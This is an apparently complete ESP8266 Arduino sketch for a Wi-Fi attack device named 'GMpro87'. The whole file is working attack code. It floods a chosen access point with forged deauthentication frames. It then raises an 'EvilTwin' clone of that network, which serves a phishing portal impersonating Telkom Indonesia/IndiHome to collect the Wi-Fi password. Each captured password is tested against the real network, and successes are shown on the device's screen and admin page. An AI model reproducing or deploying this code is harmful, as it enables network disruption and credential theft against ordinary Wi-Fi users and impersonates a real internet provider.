#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// Library tambahan untuk OLED
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
}

// Konfigurasi OLED 0.66 64x48
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define OLED_RESET    -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pin LED Built-in Wemos
#define LED_PIN 2

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

// Fungsi Update OLED
void updateOLED(String status) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("GMpro87");
  display.println("-------");
  display.println(status);
  if(_selectedNetwork.ssid != "") {
    display.setCursor(0, 28);
    display.print("TGT:");
    display.println(_selectedNetwork.ssid.substring(0,8));
  }
  display.display();
}

// Fungsi Strobo LED
void ledStrobo() {
  for(int i=0; i<30; i++) {
    digitalWrite(LED_PIN, LOW); delay(30);
    digitalWrite(LED_PIN, HIGH); delay(30);
  }
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// CSS & HTML Dashboard Admin (Dark Mode)
String _tempHTML = R"rawliteral(
<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>
<style>
  body { font-family: sans-serif; background: #0a0a0a; color: #d1d1d1; margin: 0; padding: 15px; text-align: center; }
  .content { max-width: 500px; margin: auto; background: #151515; padding: 20px; border-radius: 12px; border: 1px solid #333; }
  h1 { color: #ee2e24; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; }
  .btns { margin-bottom: 20px; display: flex; justify-content: center; gap: 10px; }
  button { padding: 12px 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 11px;}
  .btn-act { background: #444; color: white; }
  .btn-act:disabled { background: #222; color: #555; cursor: not-allowed; }
  table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; border-radius: 8px; overflow: hidden; }
  th { background: #333; color: #ee2e24; padding: 10px; font-size: 12px; }
  td { padding: 10px; border-bottom: 1px solid #282828; font-size: 11px; }
  .btn-sel { background: #555; color: white; padding: 6px 10px; border-radius: 4px; border: none; }
  .selected { background: #2e7d32 !important; color: white; font-weight: bold; }
</style>
</head><body><div class='content'>
<h1>GMpro87</h1>
<div class='btns'>
<form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
<button class='btn-act'{disabled}>{deauth_button}</button></form>
<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
<button class='btn-act'{disabled}>{hotspot_button}</button></form>
</div><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Select</th></tr>
)rawliteral";

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("OLED gagal"));
  }
  updateOLED("Ready");

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  
  // SSID & PASS Admin GMpro
  WiFi.softAP("GMpro", "Sangkur87");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/CurrentTarget", []() {
    webServer.send(200, "text/plain", _selectedNetwork.ssid);
  });
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  updateOLED("Scanning");
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
  updateOLED("Scan Done");
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script><body><h2>Wrong Password</h2></body></html>");
  } else {
    webServer.send(200, "text/html", "<html><body><h2>Good password</h2></body></html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect (true);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("GMpro", "Sangkur87");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    
    _correct = "DAPET! SSID: " + _selectedNetwork.ssid + " PASS: " + _tryPassword;
    
    // Tampilkan di OLED
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("PASS GOT!");
    display.println("---------");
    display.println(_selectedNetwork.ssid.substring(0,10));
    display.println(_tryPassword);
    display.display();
    
    ledStrobo();
  }
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") { deauthing_active = true; updateOLED("DEAUTH ON"); }
    else if (webServer.arg("deauth") == "stop") { deauthing_active = false; updateOLED("DEAUTH OFF"); }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      updateOLED("EVIL ON");
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("GMpro", "Sangkur87");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      updateOLED("EVIL OFF");
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      String bssidStr = bytesToStr(_networks[i].bssid, 6);
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bssidStr + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bssidStr + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bssidStr) _html += "<button class='btn-sel selected'>Selected</button></form></td></tr>";
      else _html += "<button class='btn-sel'>Select</button></form></td></tr>";
    }

    _html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
    _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
    _html.replace("{disabled}", (_selectedNetwork.ssid == "") ? " disabled" : "");

    _html += "</table>";
    if (_correct != "") _html += "</br><div style='color:#2ecc71; font-weight:bold;'>" + _correct + "</div>";
    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<h2>Updating...</h2>");
    } else {
      // Portal Evil Twin Telkom/Indihome
      String portalHTML = R"rawliteral(
<!DOCTYPE html><html><head><title id="TARGET">Autentikasi Broadband</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body { color: #333; font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
nav { background: #ee2e24; color: #fff; padding: 1.5em 1em; text-align: center; border-bottom: 4px solid #d1271f; }
nav b { display: block; font-size: 1.4em; text-transform: uppercase; }
.main-content { background: #fff; margin: 20px auto; padding: 2em; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
h1 { font-size: 1.2em; color: #ee2e24; text-align: center; }
.status-msg { background: #fff5f5; border: 1px solid #feb2b2; color: #c53030; padding: 10px; font-size: 0.9em; margin-bottom: 1.5em; border-radius: 4px; text-align: center; }
input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
input[type="submit"] { width: 100%; padding: 12px; background-color: #ee2e24; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
.footer { text-align: center; margin-top: 2em; font-size: 10px; color: #999; }
</style></head><body><nav><b id="SSID">Connecting...</b><p>INDIHOME FIBER BROADBAND</p></nav>
<div class="main-content"><h1>Verifikasi Kata Sandi</h1><div class="status-msg">Sesi terputus. Silakan masukkan ulang password Wi-Fi Anda.</div>
<form action="/"><label><b>Password Wi-Fi:</b></label><input type="password" name="password" minlength="8" required><input type="submit" value="HUBUNGKAN SEKARANG"></form></div>
<div class="footer">&copy; 2026 PT Telkom Indonesia (Persero) Tbk.</div>
<script>var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.readyState==4&&this.status==200){document.getElementById("SSID").innerHTML=this.responseText;}};xhttp.open("GET","/CurrentTarget",true);xhttp.send();</script></body></html>
)rawliteral";
      webServer.send(200, "text/html", portalHTML);
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
bool led_state = false;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    // LED Kedip saat Deauth
    led_state = !led_state;
    digitalWrite(LED_PIN, led_state);

    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    deauthPacket[0] = 0xC0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }

  // Jika Hotspot Aktif saja, LED Nyala terus
  if (hotspot_active && !deauthing_active) {
    digitalWrite(LED_PIN, LOW); 
  } else if (!hotspot_active && !deauthing_active) {
    digitalWrite(LED_PIN, HIGH); 
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }
}
